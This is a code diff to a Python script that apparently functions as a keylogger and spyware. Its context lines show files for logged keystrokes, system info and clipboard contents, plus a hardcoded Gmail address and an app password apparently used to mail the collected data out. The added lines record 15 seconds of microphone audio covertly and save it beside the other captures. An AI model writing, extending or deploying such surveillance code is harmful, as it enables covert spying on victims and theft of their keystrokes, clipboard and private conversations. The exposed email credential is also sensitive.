@@ -36,6 +36,9 @@ from requests import get
 key_info = "key_log.txt"
 sys_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
+audio_info = "audio.wav"
+
+mic_time = 15
 
 email_addr = "divkirnapure7@gmail.com"
 password = "uqrlxmkvoncsccru"
@@ -174,3 +177,18 @@ def copy_clipboard():
             f.write("the clipboard could not be copied.")
 
 copy_clipboard()
+
+# recording audio information
+
+def microphone():
+    fs = 44100
+    seconds = mic_time
+
+    my_recording = sd.rec(int(seconds * fs), samplerate= fs, channels= 2)
+    sd.wait()
+    print("recording finished")
+
+    write(file_path + extend + audio_info, fs , my_recording)
+
+
+microphone()
